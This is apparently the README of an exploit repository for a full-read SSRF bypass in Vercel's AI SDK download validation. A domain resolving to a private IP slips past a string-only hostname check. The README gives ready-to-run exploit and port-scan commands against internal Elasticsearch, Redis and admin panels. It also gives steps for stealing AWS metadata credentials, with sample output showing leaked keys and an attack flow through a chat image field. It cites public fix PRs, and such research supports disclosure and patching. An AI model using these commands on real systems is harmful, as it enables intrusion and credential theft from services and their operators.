```


         ______           __     ______          __
        / ____/  ______  / /__  / ____/___  ____/ /__
       / /_     / ___/ |/_/ _ \/ /   / __ \/ __  / _ \
      / __/    / /  _>  </  __/ /___/ /_/ / /_/ /  __/
     /_/      /_/  /_/|_|\___/\____/\____/\__,_/\___/

        AI SDK SSRF // validateDownloadUrl DNS Bypass
        Full-Read SSRF. No rebinding. One A record.


             ___       _   ____        _
            | _ \ __ _| |_| ___|  __ _| | __
            |   // _` |  _|___ \ / _` | |/ /
            | |\ \ (_| | |_ ___) | (_| |   <
            |_| \_\__,_|\__|____/ \__,_|_|\_\

```

## tl;dr

Vercel's AI SDK has SSRF protection (`validateDownloadUrl`) that only checks if the hostname is a literal private IP string. it never resolves DNS. so if you point a domain at `127.0.0.1` and pass it through, the check sees a normal hostname and lets it fly. then `downloadBlob()` resolves DNS, connects to localhost, and hands you back the full response body.

zero rebinding needed. just a domain with an A record pointing to a private IP.

```
validateDownloadUrl("http://127.0.0.1/secret")              → BLOCKED
validateDownloadUrl("http://ssrf.yourdomain.com/secret")     → PASSES
downloadBlob("http://ssrf.yourdomain.com/secret")            → full response from localhost
```

this is not blind SSRF. you get the actual data back.

## affected

`@ai-sdk/provider-utils` versions with `validateDownloadUrl` (4.0.19+)

any app using the AI SDK that takes image/file URLs from users through `generateText()`, `streamText()`, or calls `downloadBlob()` directly.

## prereq

you need a domain you control with an A record pointing to a private IP. one DNS record in cloudflare or whatever you use:

```
ssrf.yourdomain.com  →  A  →  127.0.0.1
```

thats it. no NS delegation, no rebinding server, no infra.

## setup

```bash
git clone https://github.com/YOURUSERNAME/ai-sdk-ssrf-research
cd ai-sdk-ssrf-research
npm install
```

## usage

### read from internal services

```bash
node exploit.mjs http://ssrf.yourdomain.com:9200/           # elasticsearch
node exploit.mjs http://ssrf.yourdomain.com:6379/           # redis
node exploit.mjs http://ssrf.yourdomain.com:8080/admin      # admin panels
```

for AWS metadata, make a record pointing to 169.254.169.254:
```bash
node exploit.mjs http://meta.yourdomain.com/latest/meta-data/
```

### scan internal ports

```bash
node scan.mjs ssrf.yourdomain.com
```

### full demo with fake services

```bash
# terminal 1 - start fake elasticsearch, redis, admin panel on localhost
bash start-services.sh

# terminal 2 - steal everything
node exploit.mjs http://ssrf.yourdomain.com:9200/
node exploit.mjs http://ssrf.yourdomain.com:6379/
node exploit.mjs http://ssrf.yourdomain.com:8080/
```

### example output

```
[*] Target: http://ssrf.yourdomain.com:9200/
[*] ssrf.yourdomain.com resolves to 127.0.0.1
[+] Direct 127.0.0.1: BLOCKED by validateDownloadUrl
[+] ssrf.yourdomain.com: PASSES validation (not a literal IP)
[*] Fetching via downloadBlob()...

[!] SSRF SUCCESSFUL
[!] 142 bytes, type: application/json
[!] Response:
{
  "cluster_name": "prod-cluster",
  "status": "green",
  "nodes": 3,
  "secrets": {
    "aws_key": "AKIAIOSFODNN7EXAMPLE",
    "db_pass": "super_secret_prod_password"
  }
}
```

### port scanner output

```
Scanning ssrf.yourdomain.com via AI SDK downloadBlob()

  :80    ERROR    68ms   connection refused
  :3000  OPEN     1937ms 9020 bytes  text/html
  :6379  OPEN     28ms   88 bytes    text/plain
  :8080  OPEN     495ms  97 bytes    text/html
  :9200  OPEN     26ms   142 bytes   application/json
  :3306  CLOSED   543ms
  :5432  CLOSED   27ms
```

## root cause

`packages/provider-utils/src/validate-download-url.ts`:

```typescript
const hostname = parsed.hostname;

// only checks strings. never calls dns.lookup().
if (hostname === 'localhost' || hostname.endsWith('.local')) throw ...
if (isIPv4(hostname) && isPrivateIPv4(hostname)) throw ...

// "ssrf.yourdomain.com" is not "localhost" and is not an IPv4 literal.
// passes every check. fetch() resolves DNS and connects to 127.0.0.1.
```

string matching is not network security.

## how this works in a real attack

```
attacker sends chat message to target app:
  { type: 'image', image: 'http://ssrf.attacker.com:9200/' }

          |
          v

app calls generateText({ messages })

          |
          v

convertToLanguageModelPrompt() calls downloadAssets()

          |
          v

download() calls validateDownloadUrl("http://ssrf.attacker.com:9200/")
  hostname is "ssrf.attacker.com"
  not "localhost", not a literal IPv4
  PASSES

          |
          v

fetch("http://ssrf.attacker.com:9200/")
  DNS resolves to 127.0.0.1
  connects to localhost:9200
  reads full elasticsearch response

          |
          v

response data sent to AI model as "image"
model may describe the JSON in its text response
  internal data leaked to attacker through chat
```

## repo structure

```
├── exploit/
│   ├── poc.mjs              # main exploit - full read SSRF
│   ├── scan.mjs             # internal port scanner via SSRF
│   ├── mock_imds.py         # simulated AWS metadata service
│   ├── start-services.sh    # simulated internal services (ES, Redis, admin)
│   └── package.json         # npm deps
├── docs/
│   └── ROOT_CAUSE.md        # deep dive on why the validation fails
├── README.md
└── .gitignore
```

## stealing AWS credentials demo

```bash
# terminal 1 - start the mock AWS metadata endpoint
cd exploit/
python3 mock_imds.py

# terminal 2 - steal the creds via SSRF
cd exploit/
npm install
node poc.mjs http://ssrf.yourdomain.com:8888/latest/meta-data/iam/security-credentials/prod-web-role
```

output:
```
[!] SSRF SUCCESSFUL
[!] Response:
{
  "Code": "Success",
  "LastUpdated": "2026-03-24T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEBYaCXVzLWVhc3QtMSJGMEQCIH7e...[TRUNCATED]",
  "Expiration": "2026-03-24T18:00:00Z"
}
```

## references

- [GitHub Issue #13510](https://github.com/vercel/ai/issues/13510) - public report
- [Fix PR #13512](https://github.com/vercel/ai/pull/13512)
- [Fix PR #13718](https://github.com/vercel/ai/pull/13718)
- [validateDownloadUrl source](https://github.com/vercel/ai/blob/main/packages/provider-utils/src/validate-download-url.ts)

same bug in other projects:
- [pydantic-ai GHSA-2jrp-274c-jhv3](https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3)
- [mindsdb GHSA-4jcv-vp96-94xr](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-4jcv-vp96-94xr)
- [esm.sh GHSA-p2v6-84h2-5x4r](https://github.com/esm-dev/esm.sh/security/advisories/GHSA-p2v6-84h2-5x4r)
- [vLLM CVE-2026-24779](https://dailycve.com/vllm-ssrf-bypass-cve-2026-24779-high/)

## disclaimer

for authorized security testing and research only. dont use this on systems you dont own or have permission to test.
